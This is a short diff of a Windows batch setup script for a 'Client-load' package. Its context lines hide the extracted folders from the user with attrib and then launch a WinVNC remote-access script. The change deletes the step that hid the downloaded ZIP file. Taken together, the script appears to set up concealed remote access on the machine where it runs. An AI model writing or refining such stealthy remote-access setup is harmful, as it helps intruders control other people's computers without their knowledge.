@@ -36,18 +36,9 @@ REM Hide the extracted Client-load folder and its parent folder
 attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
 
-REM Determine the path to the Client-load.zip file in the Downloads folder
-set zip_file_path=%USERPROFILE%\Downloads\Client-load.zip
-
-REM Debug step: Print the path to confirm it is correct
-echo Hiding ZIP file at: %zip_file_path%
-
-REM Hide the Client-load.zip file in the Downloads folder
-attrib +h "%zip_file_path%"
-
 REM Display a completion message
 echo.
-echo Startup setup completed. Parent folders and ZIP file hidden.
+echo Startup setup completed. Parent folders hidden.
 
 REM Run run_winvnc.bat at the end
 if exist "%script_dir%run_winvnc.bat" (
